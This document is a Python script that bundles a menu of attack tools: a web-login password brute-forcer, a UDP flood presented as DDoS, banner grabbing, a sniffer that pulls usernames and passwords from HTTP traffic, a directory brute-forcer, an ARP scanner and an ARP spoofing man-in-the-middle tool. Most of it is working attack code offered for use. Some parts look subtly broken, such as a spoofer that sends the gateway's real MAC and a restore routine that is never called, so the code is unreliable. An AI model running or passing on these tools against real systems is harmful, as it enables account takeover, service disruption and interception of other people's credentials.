import os


def menu():
    # os.system('clear') clears the terminal screen
    print("Choose an option:")
    print("1. Brute Force")
    print("2. DDoS")
    print("3. Banner Grabbing")
    print("4. Packet Sniffer")
    print("5. Discover Directory")
    print("6. Network Scanner")
    print("7. ARP Spoof")
    print("0. Exit")


while True:

    menu()

    choice = input("Enter your choice: ")
    if choice == "1":
        # code for Brute Force

        #!/usr/bin/python3
        import concurrent.futures
        import requests

        # Define a function to check the validity of a given password for a given URL
        def check_password(url, password):
            # Use a requests session to maintain a connection to the server
            with requests.Session() as session:
                # Send a POST request with the username, password, and submit button data
                response = session.post(
                    url, data={'uname': 'test', 'pass': password, 'sub': 'submit'}, timeout=10)
                # Check if the response indicates that the login was successful
                if b"Logged into the system" in response.content:
                    print(
                        "=========== [+] PASSWORD CRACKED: " + password + " =========")
                    return True
                else:
                    print("[-] Password invalid: " + password)
                    return False

        # Define the main function to run the script
        def main():
            # Get the URL to test and the name of the dictionary file from the user
            url = input("Enter the URL to test: ")
            dic_file = input("Enter the name of the dictionary file: ")
            max_threads = 10  # Set the maximum number of threads to use

            # Read the passwords from the dictionary file into a list
            with open(dic_file, 'r') as f:
                passwords = [line.strip() for line in f]

            # Use multithreading to check each password in the list
            with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
                # Map the check_password function onto the list of passwords, passing the same URL for each check
                results = list(executor.map(check_password, [
                               url]*len(passwords), passwords))

        # Make sure the main function is only called when the script is run directly, not when it is imported as a module
        if __name__ == '__main__':
            main()

        pass

    elif choice == "2":
        # code for DDoS

        #!/usr/bin/python3
        import os
        import time
        import socket
        import random

        def main():
            # Date and Time Declaration and Initialization
            mydate = time.strftime('%Y-%m-%d')
            mytime = time.strftime('%H-%M')

            # Define sock and bytes for the attack
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(1490)

            # Type in the IP and port number to attack
            ip = input("IP Target: ")
            port = int(input("Port: "))

            # Start the attack
            print(f"Starting the attack on {ip} at port {port}...")

            # Send packets
            sent = 0
            while True:
                sock.sendto(bytes, (ip, port))
                sent += 1
                port += 1
                print(f"Sent {sent} packet to {ip} through port: {port}")
                if port == 65534:
                    port = 1
                try:
                    input()
                    break
                except KeyboardInterrupt:
                    break

        if __name__ == '__main__':
            main()

        pass

    elif choice == "3":
        # code for Banner Grabbing

        #!/usr/bin/python3
        import socket
        import threading

        def banner(ip, port):
            con = socket.socket()
            try:
                con.connect((ip, port))
                con.settimeout(2)
                banner = con.recv(1024)
                print(
                    f"[+] Banner from {ip}:{port}: {banner.decode().strip()}")
            except:
                pass
            finally:
                con.close()

        def main():
            ip = input("Enter the IP address: ")
            ports = [21, 22, 25, 80, 110, 443]

            for port in ports:
                t = threading.Thread(target=banner, args=(ip, port))
                t.start()

        if __name__ == '__main__':
            main()

        pass

    elif choice == "4":
        # code for Packet Sniffer

        #!/usr/bin/python3
        import argparse
        import threading
        import scapy.all as scapy
        from scapy.layers import http

        # Function to capture and sniff packets on the specified interface
        def sniff_packets(interface):
            # Use scapy to sniff packets on the specified interface
            scapy.sniff(iface=interface, store=False,
                        prn=process_sniffed_packet, filter="port 80 or port 443")

        # Function to extract the URL from an HTTP request
        def get_url(packet):
            # Extract the host and path from the HTTP request packet
            host = packet[http.HTTPRequest].Host
            path = packet[http.HTTPRequest].Path
            return host + path

        # Function to extract login information from the packet
        def get_login_info(packet):
            # Define keywords to search for in the packet load
            keywords = ['login', 'user', 'pass', 'username', 'password']
            # Check if packet has a Raw layer
            if packet.haslayer(scapy.Raw):
                # Decode the packet load in UTF-8 format
                load = packet[scapy.Raw].load.decode('utf-8', 'ignore')
                # Search for the keywords in the decoded packet load
                for keyword in keywords:
                    if keyword in load.lower():
                        return load

        # Function to process and analyze the sniffed packet
        def process_sniffed_packet(packet):
            # Check if the packet has an HTTP request layer
            if packet.haslayer(http.HTTPRequest):
                # Extract the URL from the HTTP request packet
                url = get_url(packet)
                print("[+] HTTP Request > " + url)

                # Extract login information from the packet
                login_info = get_login_info(packet)
                if login_info:
                    print(
                        "\n\n[+] Possible username and password: " + login_info + "\n\n")

        # Main function to parse command line arguments and start packet sniffing
        def main():
            # Define command line arguments
            parser = argparse.ArgumentParser()
            parser.add_argument("-i", "--interface", dest="interface",
                                help="Specify the interface to capture packets")

            # Parse the command line arguments
            args = parser.parse_args()

            # Check if the interface is specified
            if not args.interface:
                parser.error(
                    "[-] Please specify an interface to capture packets, use --help for more info.")

            # Create a new thread to capture packets on the specified interface
            packet_sniffer_thread = threading.Thread(
                target=sniff_packets, args=(args.interface,))
            packet_sniffer_thread.start()

        if __name__ == '__main__':
            main()

        pass

    elif choice == "5":
        # code for Discover Directory

        #!/usr/bin/python3

        import requests
        import threading
        from queue import Queue

        # function to make a request to a URL
        def request(url):
            try:
                return requests.get("http://" + url)
            except requests.exceptions.ConnectionError:
                # if there's a connection error, just ignore it and move on
                pass

        # function to discover directories at a given URL
        def dirdiscover(url, path, word):
            test_url = url + "/" + word
            response = request(test_url)
            if response:
                # if the response is successful, print the discovered URL and add the word to the path list
                print("[+] Discovered URL ----> " + test_url)
                path.append(word)

        # function to execute directory discovery using threads
        def threader(url, path, wordlist):
            while True:
                # get the next word to test from the wordlist queue
                current_word = wordlist.get()
                # call the dirdiscover function for the current word
                dirdiscover(url, path, current_word)
                # mark the task as done so the queue can keep track of completed tasks
                wordlist.task_done()

        # main function to execute the directory discovery process
        def main():
            # get the URL to scan from the user
            url = input("Enter the URL to scan: ")
            # create an empty list to store discovered paths
            path = []
            # create a queue to store words to test
            wordlist = Queue()
            # open the common_dir.txt file and add each line to the wordlist queue
            with open("common_dir.txt", "r") as wordlist_file:
                for line in wordlist_file:
                    word = line.strip()
                    wordlist.put(word)

            # create threads to execute directory discovery
            threads = []
            for i in range(10):
                t = threading.Thread(
                    target=threader, args=(url, path, wordlist))
                # set the threads as daemon threads so they can be terminated if the main program exits
                t.daemon = True
                threads.append(t)

            # start the threads
            for t in threads:
                t.start()

            # wait for all tasks in the wordlist queue to be completed
            wordlist.join()

            # recursively go through each and every path discovered in the first round of directory discovery
            for word in path:
                # create a new queue for the current word and add all words from the common_dir.txt file to it
                new_wordlist = Queue()
                with open("common_dir.txt", "r") as wordlist_file:
                    for line in wordlist_file:
                        new_word = line.strip()
                        new_wordlist.put(new_word)
                    # add the current word to the end of the new wordlist queue
                    new_wordlist.put(word)

                # create threads to execute directory discovery for the current word and all words in the new_wordlist queue
                threads = []
                for i in range(10):
                    t = threading.Thread(
                        target=threader, args=(url, path, new_wordlist))
                    t.daemon = True
                    threads.append(t)

                # start the threads
                for t in threads:
                    t.start()

                # wait for all tasks in the new_wordlist queue to be completed
                new_wordlist.join()

        if __name__ == '__main__':
            main()

        pass

    elif choice == "6":
        # code for Network Scanner

        #!/usr/bin/python3
        import scapy.all as scapy
        import argparse
        import threading

        # function to get IP address range from user input
        def get_ip():
            parser = argparse.ArgumentParser()
            parser.add_argument("-r", "--range", dest="ipaddr",
                                help="Specify an IP Address or a range of IP Address")
            options = parser.parse_args()

            # check if the user provided an IP address or range
            if not options.ipaddr:
                parser.error(
                    "[-] Specify an IP Address or a range of IP Address --help for more details")

            return options

        # function to perform ARP scan on a single IP address
        def scan(ip):
            # create ARP packet for the given IP address
            arp_header = scapy.ARP(pdst=ip)
            ether_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_packet = ether_header / arp_header

            # send the packet and receive response
            answered_list = scapy.srp(
                arp_request_packet, timeout=1, verbose=False)[0]

            clients_list = []

            # parse the response to extract IP and MAC addresses
            for elements in answered_list:
                client_dict = {
                    "ip": elements[1].psrc, "mac": elements[1].hwsrc}
                clients_list.append(client_dict)

            return clients_list

        # function to perform ARP scan on multiple IP addresses using multiple threads
        def scan_thread(ip_list, results):
            for ip in ip_list:
                clients = scan(ip)
                results.extend(clients)

        # function to print the scan results
        def print_result(result_list):
            print("IpAddr\t\t\tMacAddr")
            print("------------------------------------------")
            for client in result_list:
                print(client['ip'], "\t\t", client['mac'])

        # main function to initiate the scan
        def main():
            # get the IP address or range from user input
            ip = get_ip().ipaddr
            ips = [f"{ip[:-1]}{i}" for i in range(1, 255)]
            threads = []
            results = []

            # divide the IP range into chunks of 10 and create a separate thread for each chunk
            for i in range(0, len(ips), 10):
                thread = threading.Thread(
                    target=scan_thread, args=(ips[i:i+10], results))
                thread.start()
                threads.append(thread)

            # wait for all threads to complete before printing the results
            for thread in threads:
                thread.join()

            # print the results
            print_result(results)

        if __name__ == '__main__':
            main()

        pass

    elif choice == "7":
        # code for ARP Spoofing

        #!/usr/bin/python3
        import scapy.all as scapy
        import argparse
        import concurrent.futures

        # Spoofs the ARP table of the target and gateway IP addresses

        def spoof(target_ip, gateway_ip, mac_dict):
            dst_mac = mac_dict[target_ip]
            src_mac = mac_dict[gateway_ip]
            arp_respond = scapy.ARP(
                op=2, pdst=target_ip, hwdst=dst_mac, psrc=gateway_ip, hwsrc=src_mac)
            scapy.send(arp_respond, verbose=False)

        # Restores the original ARP table of the target and gateway IP addresses

        def restore(destination_ip, source_ip, mac_dict):
            dst_mac = mac_dict[destination_ip]
            src_mac = mac_dict[source_ip]
            arp_respond = scapy.ARP(
                op=2, pdst=destination_ip, hwdst=dst_mac, psrc=source_ip, hwsrc=src_mac)
            scapy.send(arp_respond, verbose=False, count=4)

        # Gets the MAC address of a given IP address

        def get_mac(ip):
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = scapy.srp(
                arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc

        # Main function to run the ARP spoofing attack

        def main():
            parser = argparse.ArgumentParser(description='ARP spoofing tool')
            parser.add_argument('victim', help='Victim IP address')
            parser.add_argument('spoof', help='IP address to spoof')
            args = parser.parse_args()

            target_ip = args.victim
            gateway_ip = args.spoof

            # Dictionary to store the MAC addresses of the target and gateway IP addresses
            mac_dict = {}
            mac_dict[target_ip] = get_mac(target_ip)
            mac_dict[gateway_ip] = get_mac(gateway_ip)

            count = 0
            # Use concurrent.futures to run the spoof and restore functions in separate threads
            with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
                while True:
                    executor.submit(spoof, target_ip, gateway_ip, mac_dict)
                    executor.submit(spoof, gateway_ip, target_ip, mac_dict)

                    count += 2
                    print(f"\r[+] Sent {count} packets", end="")

                    # Send a TCP packet to ensure the connection is still active
                    scapy.sendp(scapy.Ether(
                        dst=mac_dict[target_ip])/scapy.IP()/scapy.TCP(dport=80, flags="S"), verbose=False, count=4)

        if __name__ == '__main__':
            main()

        pass
    elif choice == "0":
        print("Exiting...")
        break
    else:
        input("Invalid choice. Press Enter to try again.")
